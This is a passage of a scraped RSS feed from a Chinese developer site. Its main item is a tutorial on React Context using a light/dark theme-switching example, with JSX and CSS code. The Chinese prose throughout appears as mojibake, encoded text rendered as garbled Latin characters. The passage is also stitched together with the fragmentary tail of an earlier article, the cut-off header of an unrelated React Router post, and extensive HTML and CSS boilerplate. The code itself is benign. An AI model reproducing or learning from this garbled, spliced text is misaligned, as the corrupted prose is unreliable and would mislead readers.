<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2144db4e6a14fff8c2c5f2ae81f3e53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5ra2F5YQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767585629&amp;x-signature=XryDhxrNouyvfwT4SByPmD6AaWI%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React ä¸­ Context çš„ä½œç”¨ä¸ç”¨æ³•ï¼šä»ä¸»é¢˜åˆ‡æ¢æ¡ˆä¾‹è¯´èµ·]]></title>    <link>https://juejin.cn/post/7588411503122120740</link>    <guid>https://juejin.cn/post/7588411503122120740</guid>    <pubDate>2025-12-29T04:01:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588411503122120740" data-draft-id="7588388014505771050" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React ä¸­ Context çš„ä½œç”¨ä¸ç”¨æ³•ï¼šä»ä¸»é¢˜åˆ‡æ¢æ¡ˆä¾‹è¯´èµ·"/> <meta itemprop="keywords" content="å‰ç«¯,React.js"/> <meta itemprop="datePublished" content="2025-12-29T04:01:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†»æ¢¨æ”¿å“¥"/> <meta itemprop="url" content="https://juejin.cn/user/2373184444182659"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React ä¸­ Context çš„ä½œç”¨ä¸ç”¨æ³•ï¼šä»ä¸»é¢˜åˆ‡æ¢æ¡ˆä¾‹è¯´èµ·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2373184444182659/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†»æ¢¨æ”¿å“¥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T04:01:02.000Z" title="Mon Dec 29 2025 04:01:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">React ä¸­ Context çš„ä½œç”¨ä¸ç”¨æ³•ï¼šä»ä¸»é¢˜åˆ‡æ¢æ¡ˆä¾‹è¯´èµ·</h2>
<p>åœ¨ React å¼€å‘ä¸­ï¼Œç»„ä»¶é€šä¿¡æ˜¯ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ã€‚å¯¹äºçˆ¶å­ç»„ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ props è½»æ¾ä¼ é€’æ•°æ®ï¼›ä½†å½“ç»„ä»¶å±‚çº§è¾ƒæ·±æˆ–è·¨å¤šä¸ªå±‚çº§æ—¶ï¼Œä½¿ç”¨ props é€å±‚ä¼ é€’æ•°æ®ï¼ˆå³ "props drilling"ï¼‰ä¼šå˜å¾—ç¹çä¸”ä½æ•ˆã€‚è¿™æ—¶ï¼ŒReact çš„ Context åŠŸèƒ½å°±æˆäº†æœ€ä½³è§£å†³æ–¹æ¡ˆã€‚æœ¬æ–‡å°†ç»“åˆä¸€ä¸ªä¸»é¢˜åˆ‡æ¢çš„å®é™…æ¡ˆä¾‹ï¼Œè¯¦ç»†è®²è§£ Context çš„ä½œç”¨ä¸ç”¨æ³•ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€Context çš„æ ¸å¿ƒä½œç”¨</h3>
<p>Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰æ˜¯ React æä¾›çš„ä¸€ç§è·¨ç»„ä»¶æ•°æ®å…±äº«æœºåˆ¶ï¼Œå®ƒå…è®¸æˆ‘ä»¬åœ¨ç»„ä»¶æ ‘ä¸­åˆ›å»ºä¸€ä¸ª "å…¨å±€" æ•°æ®ç©ºé—´ï¼Œè®©ä»»æ„å±‚çº§çš„ç»„ä»¶éƒ½èƒ½ç›´æ¥è®¿é—®å’Œä½¿ç”¨è¿™äº›æ•°æ®ï¼Œè€Œæ— éœ€é€šè¿‡ props é€å±‚ä¼ é€’ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼ŒContext è§£å†³äº†ä»¥ä¸‹é—®é¢˜ï¼š</p>
<ul>
<li>è·¨å±‚çº§ç»„ä»¶é€šä¿¡æ—¶çš„ "props ä¼ é€’é“¾è¿‡é•¿" é—®é¢˜</li>
<li>å¤šä¸ªç»„ä»¶éœ€è¦å…±äº«åŒä¸€çŠ¶æ€ï¼ˆå¦‚ä¸»é¢˜ã€ç”¨æˆ·ä¿¡æ¯ã€æƒé™ç­‰ï¼‰çš„åœºæ™¯</li>
<li>é¿å…äº†æ·±å±‚ç»„ä»¶å¿…é¡»æ¥æ”¶ä¸ç›´æ¥ä½¿ç”¨çš„ propsï¼ˆä»…ä¸ºäº†ä¼ é€’ç»™å­ç»„ä»¶ï¼‰</li>
</ul>
<h3 data-id="heading-2">äºŒã€Context çš„åŸºæœ¬ç”¨æ³•ï¼ˆç»“åˆæ¡ˆä¾‹ä»£ç ï¼‰</h3>
<p>ä¸‹é¢æˆ‘ä»¬ç»“åˆæä¾›çš„ "ä¸»é¢˜åˆ‡æ¢" æ¡ˆä¾‹ï¼Œæ‹†è§£ Context çš„ä½¿ç”¨æ­¥éª¤ã€‚æ•´ä¸ªæ¡ˆä¾‹å®ç°äº†ä¸€ä¸ªå¯åˆ‡æ¢ "æ˜äº® / æš—é»‘" ä¸»é¢˜çš„åŠŸèƒ½ï¼Œæ ¸å¿ƒä»£ç æ¶‰åŠ<code>ThemeContext.jsx</code>ã€<code>Header.jsx</code>ã€<code>App.jsx</code>ç­‰æ–‡ä»¶ã€‚</p>
<h4 data-id="heading-3">æ­¥éª¤ 1ï¼šåˆ›å»º Context å®¹å™¨</h4>
<p>é¦–å…ˆéœ€è¦é€šè¿‡<code>createContext</code>åˆ›å»ºä¸€ä¸ª Context å®¹å™¨ï¼Œç”¨äºå­˜å‚¨éœ€è¦å…±äº«çš„æ•°æ®ã€‚</p>
<p>åœ¨<code>ThemeContext.jsx</code>ä¸­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¯¼å…¥createContext</span>
<span class="hljs-keyword">import</span> { createContext } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-comment">// åˆ›å»ºContextå®¹å™¨ï¼Œé»˜è®¤å€¼ä¸ºnullï¼ˆå¯è‡ªå®šä¹‰ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);
</code></pre>
<p><code>createContext</code>æ¥æ”¶ä¸€ä¸ªé»˜è®¤å€¼ï¼ˆå½“ç»„ä»¶æ‰¾ä¸åˆ°å¯¹åº”çš„ Provider æ—¶ä½¿ç”¨ï¼‰ï¼Œè¿”å›ä¸€ä¸ª Context å¯¹è±¡ï¼Œè¯¥å¯¹è±¡åŒ…å«ä¸¤ä¸ªå±æ€§ï¼š<code>Provider</code>ï¼ˆæä¾›æ•°æ®ï¼‰å’Œ<code>Consumer</code>ï¼ˆæ¶ˆè´¹æ•°æ®ï¼Œç°ä»£ React ä¸­æ›´æ¨èç”¨<code>useContext</code>ï¼‰ã€‚</p>
<h4 data-id="heading-4">æ­¥éª¤ 2ï¼šåˆ›å»º Provider æä¾›æ•°æ®</h4>
<p>Context éœ€è¦é€šè¿‡<code>Provider</code>ç»„ä»¶å°†æ•°æ® "æ³¨å…¥" åˆ°ç»„ä»¶æ ‘ä¸­ï¼Œæ‰€æœ‰è¢«<code>Provider</code>åŒ…è£¹çš„å­ç»„ä»¶ï¼ˆæ— è®ºå±‚çº§å¤šæ·±ï¼‰éƒ½èƒ½è®¿é—®è¿™äº›æ•°æ®ã€‚</p>
<p>åœ¨<code>ThemeContext.jsx</code>ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†<code>ThemeProvider</code>ç»„ä»¶ä½œä¸ºæ•°æ®æä¾›è€…ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> { createContext } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);

<span class="hljs-comment">// ThemeProviderç»„ä»¶æ¥æ”¶childrenï¼ˆå­ç»„ä»¶æ ‘ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeProvider</span>(<span class="hljs-params">{ children }</span>) {
  <span class="hljs-comment">// ç»´æŠ¤ä¸»é¢˜çŠ¶æ€ï¼ˆlight/darkï¼‰</span>
  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">'light'</span>);
  
  <span class="hljs-comment">// å®šä¹‰åˆ‡æ¢ä¸»é¢˜çš„æ–¹æ³•</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleTheme</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setTheme</span>(<span class="hljs-function">(<span class="hljs-params">t</span>) =&gt;</span> t === <span class="hljs-string">'light'</span> ? <span class="hljs-string">'dark'</span> : <span class="hljs-string">'light'</span>);
  };
  
  <span class="hljs-comment">// ç›‘å¬themeå˜åŒ–ï¼ŒåŒæ­¥åˆ°DOMï¼ˆç”¨äºCSSä¸»é¢˜åˆ‡æ¢ï¼‰</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'data-theme'</span>, theme);
  }, [theme]);
  
  <span class="hljs-comment">// é€šè¿‡Providerçš„valueå±æ€§æä¾›æ•°æ®å’Œæ–¹æ³•</span>
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">theme</span>, <span class="hljs-attr">toggleTheme</span> }}&gt;</span>
      {children} {/* å­ç»„ä»¶æ ‘ */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span>
  );
}
</code></pre>
<p>è¿™é‡Œçš„å…³é”®æ˜¯ï¼š</p>
<ul>
<li><code>ThemeProvider</code>å†…éƒ¨ç®¡ç†å…±äº«çŠ¶æ€ï¼ˆ<code>theme</code>ï¼‰å’Œä¿®æ”¹çŠ¶æ€çš„æ–¹æ³•ï¼ˆ<code>toggleTheme</code>ï¼‰</li>
<li>é€šè¿‡<code>ThemeContext.Provider</code>çš„<code>value</code>å±æ€§ï¼Œå°†éœ€è¦å…±äº«çš„æ•°æ®ï¼ˆ<code>theme</code>ï¼‰å’Œæ–¹æ³•ï¼ˆ<code>toggleTheme</code>ï¼‰ä¼ é€’ç»™å­ç»„ä»¶</li>
<li>æ‰€æœ‰è¢«<code>ThemeContext.Provider</code>åŒ…è£¹çš„å­ç»„ä»¶ï¼Œéƒ½èƒ½è®¿é—®<code>value</code>ä¸­çš„å†…å®¹</li>
</ul>
<h4 data-id="heading-5">æ­¥éª¤ 3ï¼šåœ¨ç»„ä»¶ä¸­æ¶ˆè´¹ Context æ•°æ®</h4>
<p>å­ç»„ä»¶éœ€è¦ä½¿ç”¨<code>useContext</code>é’©å­ï¼ˆæˆ–<code>Consumer</code>ç»„ä»¶ï¼‰æ¥è·å– Context ä¸­çš„æ•°æ®ã€‚</p>
<p>åœ¨<code>Header.jsx</code>ä¸­ï¼Œæˆ‘ä»¬å®ç°äº†ä¸€ä¸ªæ˜¾ç¤ºå½“å‰ä¸»é¢˜å¹¶æä¾›åˆ‡æ¢æŒ‰é’®çš„ç»„ä»¶ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useContext } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ThemeContext</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"../contexts/ThemeContext"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// é€šè¿‡useContextè·å–ThemeContextä¸­çš„æ•°æ®</span>
  <span class="hljs-keyword">const</span> { theme, toggleTheme } = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">marginBottom:</span> <span class="hljs-attr">24</span> }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å½“å‰ä¸»é¢˜: {theme}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      {/* ç‚¹å‡»æŒ‰é’®è°ƒç”¨toggleThemeåˆ‡æ¢ä¸»é¢˜ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{toggleTheme}</span>&gt;</span>åˆ‡æ¢ä¸»é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>è¿™é‡Œçš„<code>useContext(ThemeContext)</code>ç›´æ¥è·å–äº†<code>ThemeProvider</code>æä¾›çš„<code>theme</code>å’Œ<code>toggleTheme</code>ï¼Œæ— éœ€é€šè¿‡ props ä¼ é€’ã€‚å³ä½¿<code>Header</code>ç»„ä»¶åµŒå¥—åœ¨å¤šå±‚ç»„ä»¶ä¹‹ä¸‹ï¼Œåªè¦å®ƒåœ¨<code>ThemeProvider</code>çš„å­æ ‘ä¸­ï¼Œå°±èƒ½ç›´æ¥è®¿é—®è¿™äº›æ•°æ®ã€‚</p>
<h4 data-id="heading-6">æ­¥éª¤ 4ï¼šåœ¨æ ¹ç»„ä»¶ä¸­ä½¿ç”¨ Provider</h4>
<p>æœ€åéœ€è¦åœ¨ç»„ä»¶æ ‘çš„æŸä¸ªé¡¶å±‚ä½ç½®ä½¿ç”¨<code>ThemeProvider</code>ï¼Œç¡®ä¿å…¶åŒ…è£¹æ‰€æœ‰éœ€è¦è®¿é—® Context æ•°æ®çš„ç»„ä»¶ã€‚</p>
<p>åœ¨<code>App.jsx</code>ä¸­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">ThemeProvider</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./contexts/ThemeContext"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Page</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./pages/Page'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      {/* ç”¨ThemeProvideråŒ…è£¹Pageç»„ä»¶ï¼Œä½¿å…¶å­æ ‘èƒ½è®¿é—®ä¸»é¢˜æ•°æ® */}
      <span class="hljs-tag">&lt;<span class="hljs-name">ThemeProvider</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Page</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeProvider</span>&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
}
</code></pre>
<p><code>Page</code>ç»„ä»¶åŠå…¶å†…éƒ¨çš„<code>Header</code>ç»„ä»¶ï¼Œç”±äºè¢«<code>ThemeProvider</code>åŒ…è£¹ï¼Œå› æ­¤éƒ½èƒ½è®¿é—®åˆ°ä¸»é¢˜ç›¸å…³çš„æ•°æ®ã€‚</p>
<h4 data-id="heading-7">æ­¥éª¤ 5ï¼šé…åˆæ ·å¼å®ç°ä¸»é¢˜åˆ‡æ¢</h4>
<p>æ¡ˆä¾‹ä¸­è¿˜é€šè¿‡ CSS å˜é‡å’Œ<code>data-theme</code>å±æ€§ï¼Œå®ç°äº†ä¸»é¢˜æ ·å¼çš„åˆ‡æ¢ï¼Œè¿™ä¹Ÿä½“ç°äº† Context çš„å®é™…ä»·å€¼ï¼š</p>
<p>åœ¨<code>theme.css</code>ä¸­ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* å®šä¹‰é»˜è®¤ï¼ˆæ˜äº®ä¸»é¢˜ï¼‰å˜é‡ */</span>
<span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-attr">--bg-color</span>: <span class="hljs-number">#ffffff</span>;
  <span class="hljs-attr">--text-color</span>: <span class="hljs-number">#222</span>;
  <span class="hljs-attr">--primary-color</span>: <span class="hljs-number">#1677ff</span>;
}

<span class="hljs-comment">/* æš—é»‘ä¸»é¢˜å˜é‡ */</span>
<span class="hljs-selector-attr">[data-theme=<span class="hljs-string">'dark'</span>]</span> {
  <span class="hljs-attr">--bg-color</span>: <span class="hljs-number">#141414</span>;
  <span class="hljs-attr">--text-color</span>: <span class="hljs-number">#f5f5f5</span>;
  <span class="hljs-attr">--primary-color</span>: <span class="hljs-number">#4e8cff</span>;
}

<span class="hljs-comment">/* ä½¿ç”¨å˜é‡å®šä¹‰æ ·å¼ */</span>
<span class="hljs-selector-tag">body</span> {
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--bg-color);
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color);
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
}
</code></pre>
<p>å½“<code>ThemeProvider</code>ä¸­çš„<code>theme</code>å˜åŒ–æ—¶ï¼Œ<code>useEffect</code>ä¼šæ›´æ–°<code>document.documentElement</code>çš„<code>data-theme</code>å±æ€§ï¼ŒCSS ä¼šè‡ªåŠ¨åº”ç”¨å¯¹åº”ä¸»é¢˜çš„å˜é‡ï¼Œå®ç°æ ·å¼åˆ‡æ¢ã€‚è¿™æ­£æ˜¯ Context ä¼ é€’çš„æ•°æ®é©±åŠ¨ UI å˜åŒ–çš„å®Œæ•´æµç¨‹ã€‚</p>
<h3 data-id="heading-8">ä¸‰ã€Context çš„ä½¿ç”¨æ€»ç»“</h3>
<p>é€šè¿‡ä¸Šè¿°æ¡ˆä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å‡º Context çš„æ ¸å¿ƒä½¿ç”¨æµç¨‹ï¼š</p>
<ol>
<li><strong>åˆ›å»º Context</strong>ï¼š<code>const MyContext = createContext(é»˜è®¤å€¼)</code></li>
<li><strong>æä¾›æ•°æ®</strong>ï¼šé€šè¿‡<code>MyContext.Provider</code>çš„<code>value</code>å±æ€§ä¼ é€’æ•°æ®ï¼ŒåŒ…è£¹éœ€è¦è®¿é—®æ•°æ®çš„ç»„ä»¶æ ‘</li>
<li><strong>æ¶ˆè´¹æ•°æ®</strong>ï¼šåœ¨å­ç»„ä»¶ä¸­é€šè¿‡<code>useContext(MyContext)</code>è·å–æ•°æ®</li>
</ol>
<p>Context ç‰¹åˆ«é€‚åˆå…±äº« "å…¨å±€" æ€§è´¨çš„æ•°æ®ï¼ˆå¦‚ä¸»é¢˜ã€ç”¨æˆ·ä¿¡æ¯ã€è¯­è¨€è®¾ç½®ç­‰ï¼‰ï¼Œä½†éœ€æ³¨æ„ï¼šä¸è¦è¿‡åº¦ä½¿ç”¨ Contextï¼ˆä¼šå¢åŠ ç»„ä»¶è€¦åˆåº¦ï¼‰ï¼Œä¸” Context å˜åŒ–æ—¶ä¼šå¯¼è‡´æ‰€æœ‰æ¶ˆè´¹å®ƒçš„ç»„ä»¶é‡æ¸²æŸ“ï¼Œéœ€åˆç†è®¾è®¡çŠ¶æ€ç²’åº¦ã€‚</p>
<p>é€šè¿‡è¿™ä¸ªä¸»é¢˜åˆ‡æ¢æ¡ˆä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ° Context å¦‚ä½•ç®€åŒ–è·¨å±‚çº§ç»„ä»¶é€šä¿¡ï¼Œè®©æ•°æ®å…±äº«å˜å¾—é«˜æ•ˆè€Œç›´è§‚ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å•é¡µåº”ç”¨è·¯ç”±æ€ä¹ˆæï¼ŸReact Router ä»åŸç†åˆ°å®æˆ˜å…¨è§£æï¼]]></title>    <link>https://juejin.cn/post/7588411503122251812</link>    <guid>https://juejin.cn/post/7588411503122251812</guid>    <pubDate>2025-12-29T04:19:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588411503122251812" data-draft-id="7588411503122071588" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å•é¡µåº”ç”¨è·¯ç”±æ€ä¹ˆæï¼ŸReact Router ä»åŸç†åˆ°å®æˆ˜å…¨è§£æï¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-29T04:19:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜¯ä½ çš„å°æ©˜å‘€"/> <meta itemprop="url" content="https://juejin.cn/user/1989458366301708"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å•é¡µåº”ç”¨è·¯ç”±æ€ä¹ˆæï¼ŸReact Router ä»åŸç†åˆ°å®æˆ˜å…¨è§£æï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1989458366301708/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜¯ä½ çš„å°æ©˜å‘€
